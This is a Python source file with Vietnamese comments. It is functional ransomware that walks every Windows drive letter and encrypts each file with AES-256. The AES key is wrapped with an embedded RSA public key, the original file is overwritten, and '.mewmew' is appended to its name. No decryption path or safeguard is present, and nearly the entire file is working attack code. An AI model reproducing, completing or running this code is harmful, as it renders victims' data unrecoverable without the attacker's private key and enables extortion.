import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as symmetric_padding
from cryptography.hazmat.primitives.asymmetric import rsa


public_key_base64 = """LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxbjZJUTBQeW5wd3UxTUFtaGRITwpSWHFkQnZGVHQ1dks3STFzL3JLRC95RVN3YXRNajJoMEJ0eWNIWkdESWI2bmpabGY4b1dnbzRlNHhvWmdkRGxtCjY2TVdTZVV2L1pGMm1wU0FjVEpDRTh2bHdJMTFNdTRPRFFSZUVVckpNYVRGb1g5ZmRhbFEzdDVVUFppUmRXbysKQjR2alR3dWdBT2V1WnZKSkJzc25MRE96NkhQZ0hBOUJSR1YzaHRJYkNJVkttQlVDS3J0bXNkVFArUXphWlhtVwo4ZmQ0dVlmQkxuRkdncGNmdk1pWHVqK2RYSW05TXlMQVZvWGZNeHdLWmNRci96NzhuYXQ4S2Z3R204bHdQaGpWCmVZUmFEZmN4Y2hUdC9pcFFkVDhEbjN1TE53aXVpNENEZEQ3dWZGMExoZ0swalhPMHdDYU9jZktxSXBjb1pjeVMKM3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="""  # Thay thế bằng khóa công khai dưới dạng base64


def load_public_key():
    public_key_bytes = base64.b64decode(public_key_base64)
    public_key = serialization.load_pem_public_key(public_key_bytes, backend=default_backend())
    return public_key


def encrypt_file(file_path, public_key):
    try:
        
        with open(file_path, "rb") as f:
            file_data = f.read()

        
        aes_key = os.urandom(32) 
        iv = os.urandom(16)  

       
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        
        padder = symmetric_padding.PKCS7(128).padder()
        padded_data = padder.update(file_data) + padder.finalize()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        
        with open(file_path, "wb") as f:
            f.write(encrypted_aes_key)  
            f.write(iv)  
            f.write(encrypted_data)  
        

        
        new_file_path = file_path + ".mewmew"
        os.rename(file_path, new_file_path)
        
        
    except PermissionError as e:
        print(f"Không thể truy cập file '{file_path}': {e}")
    except Exception as e:
        print(f"Lỗi khi mã hóa file '{file_path}': {e}")


def encrypt_directory(directory_path, public_key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            encrypt_file(file_path, public_key)


def get_all_drives():
    drives = []
    for drive_letter in range(65, 91):  
        drive = chr(drive_letter) + ":\\"
        if os.path.exists(drive): 
            drives.append(drive)
    return drives


if __name__ == "__main__":
    public_key = load_public_key()  
    drives = get_all_drives()  
    for drive in drives:
        
        encrypt_directory(drive, public_key)  
